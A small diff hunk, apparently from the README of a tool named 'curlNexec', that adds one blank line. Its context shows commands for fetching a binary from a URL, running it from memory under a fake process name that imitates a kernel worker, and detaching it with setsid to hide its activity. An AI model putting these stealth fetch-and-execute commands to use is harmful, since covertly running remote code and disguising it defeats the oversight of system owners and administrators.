@@ -63,6 +63,7 @@ Although not present on the memory disk, the running program can still be detect
  1. Cover the tracks with a fake program name
  
 `curlNexec --name <fake_name> <binary_raw_url>` by default the name is `[kworker/u:0]` 
+
  2. Detach from tty to map behaviour of deamon process
  
 `setsid curlNexec <binary_raw_url>`. *WIP call `setsid` from code*
